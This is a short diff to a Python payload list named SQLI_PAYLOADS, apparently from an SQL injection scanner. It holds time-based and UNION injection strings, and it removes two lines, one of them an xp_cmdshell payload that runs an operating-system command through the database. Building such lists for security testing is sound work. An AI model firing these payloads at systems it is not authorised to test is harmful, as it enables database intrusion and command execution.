@@ -92,8 +92,6 @@ SQLI_PAYLOADS: dict[str, list[str]] = {
   "' OR SLEEP(5)--",
   "; SELECT pg_sleep(5)--",
   "1; SELECT pg_sleep(5)--",
-  "' AND BENCHMARK(5000000,MD5(1))--",
-  "'; EXEC xp_cmdshell('ping -c 5 127.0.0.1')--",
  ],
  "union": [
   "' UNION SELECT NULL--",
